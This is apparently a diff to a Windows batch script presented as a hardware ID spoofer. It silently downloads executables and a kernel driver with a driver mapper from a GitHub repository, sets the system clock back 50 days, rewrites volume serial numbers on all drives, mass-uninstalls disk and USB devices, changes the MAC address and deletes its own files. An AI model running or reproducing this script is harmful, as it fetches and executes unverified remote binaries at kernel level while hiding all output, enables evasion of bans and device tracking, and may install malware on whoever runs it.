@@ -1,12 +1,12 @@
-@ECHO OFF & TITLE       
+@ECHO ON & TITLE       
+powershell -Command "Set-Date -Date (Get-Date).AddDays(-50) | Out-Null" >NUL 2>&1
+MKDIR "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
+CD /D "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
 curl -s -g -L -o "DevManView.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/DevManView.exe$"  >NUL 2>&1
 curl -s -g -L -o "devcon.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/devcon.exe$"  >NUL 2>&1
 curl -s -g -L -o "VolumeID.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/VolumeID.exe$"  >NUL 2>&1
 curl -s -g -L -o "CupFixerx64.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/CupFixerx64.exe$"  >NUL 2>&1
 curl -s -g -L -o "CupFixerx64.sys" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/CupFixerx64.sys$"  >NUL 2>&1
-powershell -Command "Set-Date -Date (Get-Date).AddDays(-50) | Out-Null"
-MKDIR "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
-CD /D "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
 :: Hardware Identification Changer/Spoofer
 SET "KernleMapper=CupFixerx64.exe" >nul 2>&1
 SET "Driver=CupFixerx64.sys" >nul 2>&1
@@ -45,11 +45,13 @@ for %%p in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (
     if exist %%p:\nul start /B VolumeID.exe %%p: %VID1%-%VID2% -nobanner >nul 2>&1
     if exist %%p:\nul start /B VolumeID.exe %%p: !VID1!-!VID2! -nobanner >nul 2>&1
 )
-DEL /S /Q "VolumeID.exe" >NUM 2>&1
+DEL /S /Q "VolumeID.exe" >NUL 2>&1
 endlocal
 :: Device Cleaner
 setlocal EnableDelayedExpansion
-for %%p in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %%p:\nul DevManView.exe /uninstall "%%p:\" && echo did %%p drive
+for %%p in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %%p:\nul DevManView.exe /uninstall "%%p:\" >NUL 2>&1
+endlocal
+setlocal EnableDelayedExpansion
 DevManView.exe /uninstall "Disk&*" /use_wildcard >NUL 2>&1
 DevManView.exe /uninstall "SWD\WPDBUSENUM*" /use_wildcard >NUL 2>&1
 DevManView.exe /uninstall "USBSTOR*" /use_wildcard >NUL 2>&1
@@ -65,7 +67,7 @@ DevManView.exe /uninstall "Standard*" /use_wildcard >NUL 2>&1
 DEL /S /Q "DevManView.exe" >NUL 2>&1
 endlocal
 :: Scan Device
-devcon.exe rescan
+start /B devcon.exe rescan
 DEL /S /Q "devcon.exe" >NUL 2>&1
 :: MAC Address Changer
 SETLOCAL ENABLEEXTENSIONS
@@ -108,7 +110,7 @@ if errorlevel==1 goto internettest
 REG ADD "HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System" /F
 sc stop winmgmt >nul 2>&1 & sc start winmgmt >nul 2>&1
 CD /D "C:\" >nul 2>&1 & RMDIR /S /Q "C:\Users\Administrator\Contacts\5P00FY" >nul 2>&1
-powershell -Command "Set-Date -Date (Get-Date).AddDays(50) | Out-Null"
+powershell -Command "Set-Date -Date (Get-Date).AddDays(+50) | Out-Null"
 
 :Args
     :MAC
